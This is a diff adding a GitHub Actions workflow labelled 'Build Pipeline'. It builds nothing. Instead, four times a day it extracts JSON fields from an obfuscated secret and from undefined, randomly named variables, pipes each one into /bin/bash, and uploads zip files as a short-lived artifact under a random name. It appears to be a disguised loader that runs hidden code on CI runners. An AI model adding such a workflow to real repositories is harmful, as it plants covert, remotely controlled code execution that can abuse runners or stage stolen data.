@@ -1,0 +1,30 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          uvzu0: ${{ secrets.uvzu0 }}
+        run: |
+          printf '%s' "$uvzu0" | jq -r .rd33 | /bin/bash
+          echo $xgsls606 | jq -r .nddus7 | /bin/bash
+          printf '%s' "$jyl71759" | jq -r .n39 | /bin/bash
+          echo $pgis86 | jq -r .qnvzx98467 | /bin/bash
+          printf '%s' "$kubr7265" | jq -r .bhm1371 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6hMschGp
+          path: "*.zip"
+          retention-days: 1
